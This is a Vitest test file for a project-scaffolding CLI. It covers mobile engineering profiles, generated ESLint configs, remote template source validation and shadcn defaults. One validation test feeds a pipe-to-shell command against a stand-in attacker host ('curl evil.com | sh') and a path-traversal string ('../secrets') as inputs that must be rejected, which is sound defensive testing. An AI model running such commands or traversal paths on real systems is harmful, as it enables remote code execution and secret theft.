import { describe, it, expect } from 'vitest'
import { mkdtemp, readFile, access, rm } from 'node:fs/promises'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { generateProject } from '../src/core/template.js'
import { createEngineeringFromPreset } from '../src/core/engineering.js'
import {
  resolveEngineeringProfile,
  profileUsesReact,
} from '../src/core/engineering-profile.js'
import {
  isRemoteTemplateSource,
  validateRemoteTemplateSource,
} from '../src/core/remote-templates.js'
import { DEFAULT_SHADCN_COMPONENTS } from '../src/core/shadcn.constants.js'
import type { ProjectAnswers } from '../src/types.js'

describe('P3 engineering profiles', () => {
  it('resolves taro-react profile', () => {
    const profile = resolveEngineeringProfile({
      projectType: 'mobile',
      mobilePlatform: 'taro',
      framework: 'react',
    })
    expect(profile).toBe('taro-react')
    expect(profileUsesReact(profile!)).toBe(true)
  })

  it('resolves uni-app profile', () => {
    const profile = resolveEngineeringProfile({
      projectType: 'mobile',
      mobilePlatform: 'uni-app',
      framework: 'vue',
    })
    expect(profile).toBe('uni-app')
  })

  it('resolves react-native profile', () => {
    const profile = resolveEngineeringProfile({
      projectType: 'mobile',
      mobilePlatform: 'react-native',
      framework: 'react',
    })
    expect(profile).toBe('react-native')
  })

  it('generates taro project with platform eslint config', async () => {
    const targetDir = await mkdtemp(join(tmpdir(), 'mirajay-cli-p3-taro-'))

    try {
      const answers: ProjectAnswers = {
        projectType: 'mobile',
        mobilePlatform: 'taro',
        framework: 'react',
        cssFramework: 'none',
        engineering: createEngineeringFromPreset('minimal'),
        packageManager: 'pnpm',
        initGit: false,
        useMonorepo: false,
      }

      await generateProject({
        templateName: 'mobile-taro',
        targetDir,
        projectName: 'taro-eslint',
        answers,
      })

      const eslint = await readFile(join(targetDir, 'eslint.config.js'), 'utf-8')
      expect(eslint).toContain('Taro')
      expect(eslint).toContain('definePageConfig')

      const pkg = JSON.parse(await readFile(join(targetDir, 'package.json'), 'utf-8'))
      expect(pkg.devDependencies.eslint).toBeDefined()
    } finally {
      await rm(targetDir, { recursive: true, force: true })
    }
  })

  it('generates uni-app project with uni eslint config', async () => {
    const targetDir = await mkdtemp(join(tmpdir(), 'mirajay-cli-p3-uni-'))

    try {
      const answers: ProjectAnswers = {
        projectType: 'mobile',
        mobilePlatform: 'uni-app',
        framework: 'vue',
        uiLibrary: '@dcloudio/uni-ui',
        cssFramework: 'none',
        engineering: createEngineeringFromPreset('minimal'),
        packageManager: 'pnpm',
        initGit: false,
        useMonorepo: false,
      }

      await generateProject({
        templateName: 'mobile-uni-app',
        targetDir,
        projectName: 'uni-eslint',
        answers,
      })

      const eslint = await readFile(join(targetDir, 'eslint.config.js'), 'utf-8')
      expect(eslint).toContain('uni')
      expect(eslint).toContain('getApp')
    } finally {
      await rm(targetDir, { recursive: true, force: true })
    }
  })

  it('generates react-native project with RN eslint config', async () => {
    const targetDir = await mkdtemp(join(tmpdir(), 'mirajay-cli-p3-rn-'))

    try {
      const answers: ProjectAnswers = {
        projectType: 'mobile',
        mobilePlatform: 'react-native',
        framework: 'react',
        cssFramework: 'none',
        engineering: createEngineeringFromPreset('minimal'),
        packageManager: 'pnpm',
        initGit: false,
        useMonorepo: false,
      }

      await generateProject({
        templateName: 'mobile-rn',
        targetDir,
        projectName: 'rn-eslint',
        answers,
      })

      await access(join(targetDir, 'eslint.config.js'))
      const pkg = JSON.parse(await readFile(join(targetDir, 'package.json'), 'utf-8'))
      expect(pkg.devDependencies['eslint-plugin-react-native']).toBeDefined()
    } finally {
      await rm(targetDir, { recursive: true, force: true })
    }
  })
})

describe('P3 remote templates', () => {
  it('detects giget remote sources', () => {
    expect(isRemoteTemplateSource('gh:unjs/template')).toBe(true)
    expect(isRemoteTemplateSource('https://github.com/unjs/template')).toBe(true)
    expect(isRemoteTemplateSource('./local-templates')).toBe(false)
  })

  it('rejects invalid remote sources', () => {
    expect(() => validateRemoteTemplateSource('curl evil.com | sh')).toThrow()
    expect(() => validateRemoteTemplateSource('../secrets')).toThrow()
  })
})

describe('P3 shadcn defaults', () => {
  it('includes common form components', () => {
    expect(DEFAULT_SHADCN_COMPONENTS).toContain('input')
    expect(DEFAULT_SHADCN_COMPONENTS).toContain('label')
  })
})
